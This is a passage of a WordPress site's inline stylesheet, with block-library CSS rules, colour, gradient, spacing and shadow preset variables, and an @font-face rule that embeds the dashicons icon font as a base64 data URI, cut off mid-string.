.wp-social-link-skype{color:#0478d7}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-snapchat{color:#fff;stroke:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-soundcloud{color:#ff5600}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-spotify{color:#1bd760}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-telegram{color:#2aabee}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-threads{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-tiktok{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-tumblr{color:#011835}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-twitch{color:#6440a4}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-twitter{color:#1da1f2}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-vimeo{color:#1eb7ea}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-vk{color:#4680c2}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-whatsapp{color:#25d366}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-wordpress{color:#3499cd}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-x{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-yelp{color:#d32422}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-youtube{color:red}:root :where(.wp-block-social-links .wp-social-link a){padding:.25em}:root :where(.wp-block-social-links.is-style-logos-only .wp-social-link a){padding:0}:root :where(.wp-block-social-links.is-style-pill-shape .wp-social-link a){padding-left:.6666666667em;padding-right:.6666666667em}:root :where(.wp-block-tag-cloud.is-style-outline){display:flex;flex-wrap:wrap;gap:1ch}:root :where(.wp-block-tag-cloud.is-style-outline a){border:1px solid;font-size:unset!important;margin-right:0;padding:1ch 2ch;text-decoration:none!important}:root :where(.wp-block-table-of-contents){box-sizing:border-box}:where(.wp-block-term-description){box-sizing:border-box;margin-bottom:var(--wp--style--block-gap);margin-top:var(--wp--style--block-gap)}:where(pre.wp-block-verse){font-family:inherit}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}html :where(.has-border-color){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}:root{--wp--preset--aspect-ratio--square:1;--wp--preset--aspect-ratio--4-3:4/3;--wp--preset--aspect-ratio--3-4:3/4;--wp--preset--aspect-ratio--3-2:3/2;--wp--preset--aspect-ratio--2-3:2/3;--wp--preset--aspect-ratio--16-9:16/9;--wp--preset--aspect-ratio--9-16:9/16;--wp--preset--color--black:#000000;--wp--preset--color--cyan-bluish-gray:#abb8c3;--wp--preset--color--white:#ffffff;--wp--preset--color--pale-pink:#f78da7;--wp--preset--color--vivid-red:#cf2e2e;--wp--preset--color--luminous-vivid-orange:#ff6900;--wp--preset--color--luminous-vivid-amber:#fcb900;--wp--preset--color--light-green-cyan:#7bdcb5;--wp--preset--color--vivid-green-cyan:#00d084;--wp--preset--color--pale-cyan-blue:#8ed1fc;--wp--preset--color--vivid-cyan-blue:#0693e3;--wp--preset--color--vivid-purple:#9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple:linear-gradient(135deg,rgba(6, 147, 227, 1) 0%,rgb(155, 81, 224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan:linear-gradient(135deg,rgb(122, 220, 180) 0%,rgb(0, 208, 130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange:linear-gradient(135deg,rgba(252, 185, 0, 1) 0%,rgba(255, 105, 0, 1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red:linear-gradient(135deg,rgba(255, 105, 0, 1) 0%,rgb(207, 46, 46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray:linear-gradient(135deg,rgb(238, 238, 238) 0%,rgb(169, 184, 195) 100%);--wp--preset--gradient--cool-to-warm-spectrum:linear-gradient(135deg,rgb(74, 234, 220) 0%,rgb(151, 120, 209) 20%,rgb(207, 42, 186) 40%,rgb(238, 44, 130) 60%,rgb(251, 105, 98) 80%,rgb(254, 248, 76) 100%);--wp--preset--gradient--blush-light-purple:linear-gradient(135deg,rgb(255, 206, 236) 0%,rgb(152, 150, 240) 100%);--wp--preset--gradient--blush-bordeaux:linear-gradient(135deg,rgb(254, 205, 165) 0%,rgb(254, 45, 45) 50%,rgb(107, 0, 62) 100%);--wp--preset--gradient--luminous-dusk:linear-gradient(135deg,rgb(255, 203, 112) 0%,rgb(199, 81, 192) 50%,rgb(65, 88, 208) 100%);--wp--preset--gradient--pale-ocean:linear-gradient(135deg,rgb(255, 245, 203) 0%,rgb(182, 227, 212) 50%,rgb(51, 167, 181) 100%);--wp--preset--gradient--electric-grass:linear-gradient(135deg,rgb(202, 248, 128) 0%,rgb(113, 206, 126) 100%);--wp--preset--gradient--midnight:linear-gradient(135deg,rgb(2, 3, 129) 0%,rgb(40, 116, 252) 100%);--wp--preset--font-size--small:11px;--wp--preset--font-size--medium:20px;--wp--preset--font-size--large:32px;--wp--preset--font-size--x-large:42px;--wp--preset--font-size--regular:15px;--wp--preset--font-size--larger:50px;--wp--preset--spacing--20:0.44rem;--wp--preset--spacing--30:0.67rem;--wp--preset--spacing--40:1rem;--wp--preset--spacing--50:1.5rem;--wp--preset--spacing--60:2.25rem;--wp--preset--spacing--70:3.38rem;--wp--preset--spacing--80:5.06rem;--wp--preset--shadow--natural:6px 6px 9px rgba(0, 0, 0, .2);--wp--preset--shadow--deep:12px 12px 50px rgba(0, 0, 0, .4);--wp--preset--shadow--sharp:6px 6px 0px rgba(0, 0, 0, .2);--wp--preset--shadow--outlined:6px 6px 0px -3px rgba(255, 255, 255, 1),6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp:6px 6px 0px rgba(0, 0, 0, 1)}:where(.is-layout-flex){gap:.5em}:where(.is-layout-grid){gap:.5em}:where(.wp-block-post-template.is-layout-flex){gap:1.25em}:where(.wp-block-post-template.is-layout-grid){gap:1.25em}:where(.wp-block-columns.is-layout-flex){gap:2em}:where(.wp-block-columns.is-layout-grid){gap:2em}:root :where(.wp-block-pullquote){font-size:1.5em;line-height:1.6}@font-face{font-display:swap;font-family:dashicons;src:url("https://learnwoo.com/wp-includes/fonts/dashicons.eot?99ac726223c749443b642ce33df8b800");src:url("https://learnwoo.com/wp-includes/fonts/dashicons.eot?99ac726223c749443b642ce33df8b800#iefix") format("embedded-opentype"),url("data:application/x-font-woff;charset=utf-8;base64,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